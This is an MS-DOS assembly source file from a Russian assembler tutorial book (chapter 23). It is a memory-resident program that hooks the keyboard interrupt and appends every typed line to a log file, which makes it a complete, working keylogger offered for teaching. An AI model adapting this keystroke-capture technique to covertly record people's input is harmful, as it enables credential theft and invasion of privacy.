
;            RESID23.ASM - программа к Главе № 23

; (С) Авторские права на файлы-приложения принадлежат автору книги
; "Ассемблер? Это просто! Учимся программировать под MS-DOS"
; Автор: Калашников Олег Александрович (e-mail: Assembler@Kalashnikoff.ru)
;	 http://www.Kalashnikoff.ru

; --- Ассемблирование (получение *.com файла) ---
;При использовании MASM 6.11 - 6.13:
;ML.EXE resid23.asm /AT

;При использовании TASM:
;TASM.EXE resid23.asm
;TLINK.EXE resid23.obj /t/x


;   === Начало программы: ===
.286
cseg segment
assume cs:cseg, ds:cseg, ss:cseg, es:cseg
org 100h

Begin:
    jmp Init ; на метку инициализации


; === Обработчик 10h-ого прерывания ===
Int_10h_proc proc
       cmp ax,0FAAFh ;Это мы проверяем на повторную загрузку?
       jne Next_step ;Нет - смотрим дальше... 

       xchg ah,al    ;Да - меняем местами ah/al
       iret

Next_step:
       cmp ax,0FBAFh ;Это мы получаем текущий адрес log-файла?
       jne Run_int   ;Нет - передаем управление 10h-прерыванию... 

       push cs       ;Заносим в ES сегмент log-файла.
       pop es
       mov di,offset File_name ;Заносим в DI смещение log-файла
       iret          ;Выходим...

Run_int:
       jmp dword ptr cs:[0F8h] ;Передаем управление 10h-прерыванию.
Int_10h_proc endp


; === Обработчик 09h-ого прерывания ===
Int_09h_proc proc
       cli    ;Запрещаем все прерывания
       pushf  ;Дадим сперва управление...
       call dword ptr cs:[0FCh]  ;...оригинальному обработчику

       pusha       ;Сохраним регистры в стеке...
       push es
       push ds

       cld         ;Направление - вперед!

       in al,60h         ;Получим СКАН-КОД нажатой клавиши.
       test al,10000000b ;(=80h) Это отпускание клавиши?
       jnz Exit_09h      ;Если так, то сохранять ее код не надо 

       mov ax,cs   ;Сегментные регистры должны указывать на наш сегмент.
       mov ds,ax
       mov es,ax

       mov ah,1    ;Получим ASCII-код нажатой клавиши.
       int 16h
       jz Ext_code ;Буфер клавиатуры пуст? Тогда на выход. 

       or al,al        ;Введен расширенный код?
       jz Flash_buffer ;Тогда сохраним все, что вводили. 

       cmp al,13       ;Нажали Enter?
       jz Flash_buffer ;Тогда сохраняем введенные символы. 

       cmp al,27   ;ESC пропускаем...
       jz Ext_code

       cmp al,8    ;Нажали Backspace?
       jz Del_sym  ;Тогда удаляем последний символ из буфера 

       cmp al,09   ;Нажали TAB?
       jne NoTab_pressed ;Тогда просто поменяем его на пробел.
       mov al,32

NoTab_pressed:
       cmp al,32   ;Нажали что-то непонятное (код меньше 20h)?
       jb Ext_code ;Тогда на выход... 

       call Store_sym ;Иначе заносим введенный символ в буфер клавиатуры. 

Ext_code:
Exit_09h:
       pop ds ;Восстановим сохраненные регистры...
       pop es
       popa

       sti   ;Разрешим прерывания и
       iret  ;выходим из процедуры.


Flash_buffer:
       call Save_string   ;Сохраняем введенную строку в файл. 
       jmp short Exit_09h ;На выход. 

Del_sym:
       call Del_symbol    ;Пользователь нажал BackSpace!
       jmp short Exit_09h ;На выход. 

Int_09h_proc endp


; === Удаляем введенный символ, если пользователь нажал BackSpace ===
Del_symbol proc
       mov ax,cs:[0F6h] ;Занесем в AX количество введенных символов.
       or ax,ax         ;Буфер пуст?
       jz Exit_del      ;Тогда на выход. 
       dec word ptr cs:[0F6h] ;Иначе уменьшаем счетчик.
Exit_del:
       ret
Del_symbol endp

; === Заносим введенный символ в наш буфер ===
Store_sym proc
       mov di,cs:[0F6h] ;Занесем в DI количество введенных символов
       cmp di,79        ;Оно больше 79?
       jb OK_store ;Нет, меньше. Тогда дописываем в буфер очередной символ. 

       push di     ;Иначе сбросим буфер в файл.
       push ax
       call Save_string
       pop ax
       pop di

OK_store:
       stosb ;Занесем очередной символ в буфер.
       inc word ptr cs:[0F6h] ;Увеличим счетчик.
       ret   ;Вернемся... 
Store_sym endp

; === Записываем введенную строку в файл ===
Save_string proc
       mov di,cs:[0F6h] ;Занесем в DI количество символов в буфере.
       or di,di         ;Оно равно 0?
       jz Nothing_save  ;Тогда писать в файл ничего не надо. 
       add word ptr cs:[0F6h],2 ;Иначе допишем к концу строки...
       mov ax,0A0Dh             ;...переход на новую строку
       stosw                    ;(для удобства чтения).

       mov ax,3D02h    ;Откроем файл для чтения/записи.
       mov dx,offset File_name
       int 21h
       jc Nothing_save ;При ошибке - на выход... 
       mov Handle,ax

       mov bx,ax
       mov ax,4202h    ;Установим указатель на конец файла.
       xor cx,cx
       xor dx,dx
       int 21h

       mov cx,cs:[0F6h] ;CX=количество записываемых символов.
       mov bx,Handle
       xor dx,dx        ;Пишем с самого начала буфера.
       mov ah,40h
       int 21h          ;Добавляем в файл введенные символы...

       mov bx,Handle    ;Закроем файл.
       mov ah,3Eh
       int 21h

Nothing_save:
       mov word ptr cs:[0F6h],0 ;Обнулим буфер ввода.
       ret ;Вернемся.

File_name db 'c:\keys', 19 dup (0) ;Имя файла для хранения введенных символов.
Handle dw ?
Save_string endp


;   === Инициализация (подготовка и настройка резидента) ===
Init:
       mov ax,0FAAFh ;Проверка на повторную загрузку.
       int 10h
       cmp ax,0AFFAh
       jne Next_step2

       mov ah,9      ;Мы уже в памяти! Выведем соответствующую строку.
       mov dx,offset Mess_memory
       int 21h

       mov ax,0FBAFh ;Получим сегмент и смещение имени log-файла
       int 10h

       mov dx,di     ;Получим командную строку
       call Get_cmd

       mov ah,3Ch    ;Создадим новый файл для записи введенных символов.
       xor cx,cx     ;Атрибуты обычные
       push es
       pop ds
       int 21h

       push cs
       pop ds

       mov bx,ax
       mov ah,3Eh ;После создания/открытия файла, его нужно закрыть!
       int 21h

No_cmdline:
       ret   ;Выйдем в DOS...

Next_step2:
       mov di,offset File_name ;DI - куда будем заносить параметры ком.строки.
       call Get_cmd ;Получим командную строку... 

       mov ah,9
       lea dx,Mess_hello ;!!! LEA DX вместо MOV DX, OFFSET
       int 21h

       mov es,word ptr cs:[2Ch] ;Получим сегмент окружения DOS.
       mov ah,49h               ;Функция освобождения памяти.
       int 21h                  ;Освобождаем память...

       mov word ptr cs:[0F6h],0 ;Обнулим буфер ввода символов.

;Проверим, существует ли уже наш log-файл.
       mov ax,3D00h
       mov dx,offset File_name
       int 21h
       jnc Ok_file

;Если не существует, то:
       mov ah,3Ch ;Создадим новый файл для записи введенных символов.
       xor cx,cx  ;Атрибуты обычные
       mov dx,offset File_name
       int 21h

Ok_file:
       mov bx,ax
       mov ah,3Eh ;После создания/открытия файла, его нужно закрыть!
       int 21h

; === 09h ===
       mov ax,3509h
       int 21h ;Получим и сохраним адрес (вектор) 09h прерывания
       mov word ptr cs:[0FCh],bx ;Смещение...
       mov word ptr cs:[0FEh],es ;Сегмент...

       mov ax,2509h
       lea dx,Int_09h_proc
       int 21h  ;"Повесим" нашу процедуру на 09h прерывание

; === 10h ===
       mov ax,3510h
       int 21h ;Получим и сохраним вектор 10h прерывания
       mov word ptr cs:[0F8h],bx
       mov word ptr cs:[0FAh],es

       mov ax,2510h
       lea dx,Int_10h_proc
       int 21h  ;"Повесим" нашу процедуру на 10h прерывание

       lea dx,Init
       int 27h  ;Оставим часть программы в памяти.


; --- Получим параметры в командной строке ---
Get_cmd proc
       mov si,80h   ;SI=смещение командной строки.
       lodsb        ;Получим кол-во символов.
       cmp al,25    ;Больше 25?
       ja No_string ;Да - на метку No_string 
       or al,al     ;Нет командной строки?
       jz No_string ;На метку No_string 

       inc si       ;Теперь SI указывает на первый символ строки.

Next_char:
       lodsb      ;Получаем очередной символ.
       cmp al,0Dh ;Конец строки?
       je Got_cmd ;Да - на выход... 
       stosb      ;Иначе - сохраним символ в переменной File_name
       jmp short Next_char ;Следующий символ... 

Got_cmd:
       xor al,al ;Строка получена! Допишем ASCII 0 в конец
       stosb
       clc  ;Сбросим флаг переноса...
       ret  ;Выходим из процедуры

No_string:
       stc  ;Строка неверна! Установим флаг переноса.
       ret  ;Выходим из процедуры
Get_cmd endp


;  === Сообщения ===
Mess_hello db 'Резидент к книге "Ассемблер? Это просто! Учимся программировать", Глава № 23.',0Ah,0Dh,0Ah
           db 'Автор: Калашников Олег Александрович (Assembler@Kalashnikoff.ru),',0Ah,0Dh
           db 'http://www.Kalashnikoff.ru, Россия, Москва, 2001 год.',0Ah,0Dh,0Ah
           db 'Для смены текущего LOG-файла необходимо запустить данную программу вновь,',0Ah,0Dh
           db 'указав в параметрах командной строки новый путь к файлу не более 25 символов.',0Ah,0Dh,'$'

Mess_memory db 0Ah,0Dh,'Программа уже загружена в память! Произведены следующие действия:',0Ah,0Dh,0Ah
            db '* Если в командной строке не указан LOG-файл, то существующий обнуляется.',0Ah,0Dh
            db '* Если файл указан (например: RESID23.COM D:\KEYS.TXT), то он создается.',0Ah,0Dh,'$'
cseg ends
end Begin
